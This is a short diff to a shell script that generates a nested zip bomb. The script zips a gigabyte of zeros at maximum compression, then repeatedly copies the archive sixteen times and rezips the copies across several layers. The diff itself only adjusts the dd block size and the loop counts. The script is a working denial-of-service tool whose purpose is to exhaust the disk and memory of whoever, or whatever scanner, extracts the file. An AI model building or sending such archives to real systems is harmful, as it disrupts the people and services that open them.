@@ -22,20 +22,20 @@ ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" |
 }
 
 create_file(){
-    dd if=/dev/zero bs=1024MB count=1 | zip -9 -q zipbomb.zip -
+    dd if=/dev/zero bs=1M count=1024 | zip -9 -q zipbomb.zip -
 }
 
 file_inside_of_file(){
     #4 layers
     for i in {0..4}
     do
-        for i in {0..16}
+        for i in {0..15}
         do
             cp zipbomb.zip $i.zip
         done
         rm zipbomb.zip
-        zip -9 -q zipbomb.zip {0..16}.zip
-        rm {0..16}.zip
+        zip -9 -q zipbomb.zip {0..15}.zip
+        rm {0..15}.zip
     done
     }
 
